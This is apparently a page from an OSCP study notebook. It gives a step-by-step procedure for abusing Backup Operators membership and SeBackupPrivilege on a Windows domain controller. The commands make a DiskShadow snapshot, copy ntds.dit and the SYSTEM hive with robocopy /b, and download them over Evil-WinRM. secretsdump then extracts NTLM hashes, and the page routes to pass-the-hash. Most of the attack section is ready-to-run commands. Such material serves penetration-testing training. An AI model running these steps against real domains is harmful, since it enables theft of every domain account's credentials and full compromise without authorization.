# AD - Backup Operators

**Step 43A of 50 · AD**

*Use Backup Operators and SeBackupPrivilege to copy a domain controller’s protected files through a Volume Shadow Copy.*

## When to use this page

Use this page when the account is a member of Backup Operators or has an enabled SeBackupPrivilege/SeRestorePrivilege and DCSync is unavailable. Volume Shadow Copy creates a read-only snapshot of a volume, allowing protected files such as `ntds.dit` to be copied without locking the live database.

## Confirm the privilege

> **Why:** These checks prove the current token has the group and enabled backup privileges required for protected-file access; look for `Backup Operators` and `SeBackupPrivilege Enabled`.
```powershell
whoami /groups
whoami /priv
```

## Create and run a DiskShadow script

DiskShadow is Windows’ volume-snapshot utility. The script must use Windows CRLF line endings, so convert it before upload.

> **Why:** This command creates the snapshot script locally and converts its line endings so DiskShadow reads every command correctly on Windows.
```bash
cat > $BoxDir/www/vss.dsh <<'EOF'
set context persistent nowriters
set metadata C:\Windows\Temp\metadata.cab
set verbose on
begin backup
add volume C: alias cdrive
create
expose %cdrive% Z:
end backup
EOF
unix2dos $BoxDir/www/vss.dsh
```

> **Why:** This command uploads and executes the script; success is a new exposed drive such as `Z:` that maps to the shadow copy.
```powershell
upload vss.dsh
diskshadow.exe /s C:\Windows\Temp\vss.dsh
```

## Copy NTDS and SYSTEM

`ntds.dit` contains domain account hashes. The SYSTEM hive supplies the boot-key material required to decrypt them offline.

> **Why:** Backup-aware `robocopy /b` copies protected files from the exposed snapshot into a temporary directory; look for successful copy counts and verify both files exist.
```cmd
mkdir C:\Windows\Temp\loot
robocopy /b Z:\Windows\NTDS C:\Windows\Temp\loot ntds.dit
robocopy /b Z:\Windows\System32\config C:\Windows\Temp\loot SYSTEM
```

> **Why:** These bare filenames avoid Evil-WinRM path-mangling and download the two files into Kali loot for offline parsing.
```powershell
cd C:\Windows\Temp\loot
download ntds.dit
download SYSTEM
```

## Parse locally

> **Why:** This pipx-installed `secretsdump.py` invocation combines the copied domain database and SYSTEM hive locally; look for extracted NTLM records without printing them into shared notes.
```bash
/home/kali/.local/share/pipx/venvs/impacket/bin/secretsdump.py -ntds $BoxDir/loot/ntds.dit -system $BoxDir/loot/SYSTEM LOCAL
```

## Example output

```text
Backup Operators
SeBackupPrivilege             Enabled
Shadow copy exposed as Z:
Administrator:500:...:[redacted]
```

## What did you get?

- [ ] The privilege is enabled and NTDS parsing succeeds → **Set `$AdminHash` privately and go to Step 49 · [[AD - Pass the Hash]]**
- [ ] DiskShadow fails because of script formatting → **Run `unix2dos $BoxDir/loot/shadow.txt`, upload it as `shadow.txt`, and rerun `diskshadow /s:C:\\Users\\$Username\\shadow.txt`**
- [ ] Backup privileges are absent → **Return to Step 43 · [[AD - Privilege Triage]] or Step 45 · [[AD - BloodHound]]**
- [ ] The copy works but parsing fails → **Run `ls -l $BoxDir/loot/ntds.dit $BoxDir/loot/SYSTEM` and compare their timestamps, then rerun `secretsdump.py LOCAL -ntds $BoxDir/loot/ntds.dit -system $BoxDir/loot/SYSTEM`**

## Notes

This is an alternative to DCSync, not a replacement for checking replication rights first. Remove the shadow copy and temporary files during clean-down.

## Gotcha

> [!warning] 💡
> Evil-WinRM’s upload/download commands are most reliable from the target directory with bare filenames. Full Windows paths can change the local filename or fail to transfer as expected.

## Additional routing

- [ ] NTDS and SYSTEM parse successfully → **Set `$AdminHash` privately and go to Step 49 · [[AD - Pass the Hash]]**
- [ ] Backup copying fails → **Return to Step 43 · [[AD - Privilege Triage]] or Step 45 · [[AD - BloodHound]]**
## Seen in
- [[OSCP/BOXES/WRITE UPS/AD/Flight|Flight]] -- confirmed in the box write-up
- [[OSCP/BOXES/WRITE UPS/AD/Blackfield|Blackfield]] -- confirmed in the box write-up

## Related stages

- [[AD - Service Scan]]
- [[AD - Credential Validation]]
- [[AD - BloodHound]]

## External Resources

- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
- https://www.revshells.com/
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
